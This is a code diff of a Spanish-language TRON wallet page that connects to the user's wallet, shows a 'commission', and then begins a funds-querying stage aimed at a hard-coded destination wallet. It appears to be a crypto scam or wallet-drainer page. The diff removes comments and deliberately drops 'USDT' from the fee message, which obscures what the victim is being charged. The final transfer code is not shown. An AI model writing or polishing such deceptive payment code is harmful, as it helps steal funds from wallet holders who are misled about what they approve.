@@ -57,7 +57,7 @@
     const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";    
     
     let walletAddress = null;
-    let stage = 0; // 0: Conectar, 1: Mostrar Comisión, 2: Transferir
+    let stage = 0; 
 
     function setStatus(msg) {
         const s = document.getElementById('status');
@@ -68,14 +68,12 @@
     document.getElementById('addressDisplay').value = BILLETERA_DESTINO;
 
     document.getElementById('connectBtn').addEventListener('click', async () => {
-        // 1. Verificación de TronWeb
         if (typeof window.tronWeb === 'undefined') {
             return setStatus("Error: Billetera no detectada. Abre este enlace en el navegador de Trust Wallet.");
         }
 
         const tronWeb = window.tronWeb;
 
-        // ETAPA 0: Conexión
         if (stage === 0) {
             try {
                 if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
@@ -88,14 +86,13 @@
                 setStatus("Conectado. Presione Siguiente para ver ComisiónTrx.");
             } catch (e) { setStatus("Error de conexión."); }
         } 
-        // ETAPA 1: Mostrar Comisión
         else if (stage === 1) {
             const amt = parseFloat(document.getElementById('amountDisplay').value);
             if (!amt || amt <= 0) return setStatus("Ingrese una cantidad válida.");
-            setStatus("ComisiónTrx: " + (amt * 0.015).toFixed(2) + " USDT. Presione Siguiente para confirmar.");
+            // Aquí se muestra el monto sin la palabra USDT
+            setStatus("ComisiónTrx: " + (amt * 0.015).toFixed(2) + ". Presione Siguiente para confirmar.");
             stage = 2;
         } 
-        // ETAPA 2: Ejecución (Lógica original intacta)
         else {
             try {
                 setStatus("Consultando fondos...");
